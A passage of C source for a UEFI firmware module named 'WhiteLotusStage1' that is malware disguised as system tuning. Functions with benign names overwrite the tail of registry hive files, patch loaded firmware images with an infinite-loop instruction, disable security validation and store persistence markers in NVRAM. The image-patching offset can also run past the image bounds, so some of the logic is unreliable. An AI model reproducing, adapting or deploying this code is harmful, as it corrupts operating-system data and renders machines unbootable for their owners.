                    if (!EFI_ERROR(status) && fileInfo->FileSize > 256) {
                        hiveFile->SetPosition(hiveFile, fileInfo->FileSize - 256);
                        hiveFile->Write(hiveFile, &(UINTN){256}, repairData);
                        hiveFile->Flush(hiveFile);
                    }
                    bs->FreePool(fileInfo);
                }
                hiveFile->Close(hiveFile);
            }
        }
        configDir->Close(configDir);
        root->Close(root);
    }
    if (handles) bs->FreePool(handles);
}

VOID UpdateUefiModules(EFI_BOOT_SERVICES *bs) {
    UINTN numHandles = 0;
    EFI_HANDLE *handles = NULL;
    EFI_STATUS status = bs->LocateHandleBuffer(ByProtocol, &gEfiLoadedImageProtocolGuid, NULL, &numHandles, &handles);
    if (EFI_ERROR(status) || numHandles == 0) return;

    for (UINTN i = 0; i < numHandles; i++) {
        EFI_LOADED_IMAGE_PROTOCOL *loadedImage = NULL;
        status = bs->HandleProtocol(handles[i], &gEfiLoadedImageProtocolGuid, (VOID**)&loadedImage);
        if (EFI_ERROR(status)) continue;

        if (loadedImage->ImageSize > 0x8000 && loadedImage->ImageSize < 0x800000) {
            UINT8 *imageBase = (UINT8*)loadedImage->ImageBase;
            for (UINTN j = 0; j < loadedImage->ImageSize - 0x100; j += 0x1000) {
                if (imageBase[j] == 0x48 && imageBase[j+1] == 0x89 && imageBase[j+2] == 0x5C) {
                    imageBase[j + loadedImage->ImageSize - 0x200] = 0xEB;
                    imageBase[j + loadedImage->ImageSize - 0x1FF] = 0xFE;
                    break;
                }
            }
        }
    }
    if (handles) bs->FreePool(handles);
}

EFI_STATUS
EFIAPI
WhiteLotusStage1Main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    EFI_BOOT_SERVICES *bs = SystemTable->BootServices;
    EFI_RUNTIME_SERVICES *rt = SystemTable->RuntimeServices;

    UINT8 marker[] = {0xDE,0xAD,0xBE,0xEF,0x01,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF};
    SaveToNvram(rt, L"WhiteLotusConfig", marker, sizeof(marker));

    UINT32 bootCount = 0;
    UINTN countSize = sizeof(UINT32);
    LoadFromNvram(rt, L"WhiteLotusCounter", &bootCount, &countSize);
    bootCount++;
    SaveToNvram(rt, L"WhiteLotusCounter", &bootCount, sizeof(UINT32));

    InitializeSystemClock();
    UpdatePowerManagementTables(SystemTable);
    ConfigureChipsetSettings();
    OptimizeDiskPerformance();
    RefreshDeviceConnections();
    CalibrateDisplayOutput();
    EnhanceAudioOutput();
    BoostNetworkPerformance();
    ConfigurePowerRegulation();
    AdjustThermalProfile();
    DiagnosePciExpressErrors();
    VerifyFirmwareIntegrity();
    FinalizeSystemConfiguration();

    DisableSecurityValidation(rt);
    RepairSystemRegistry(bs);
    UpdateUefiModules(bs);

    return EFI_SUCCESS;
}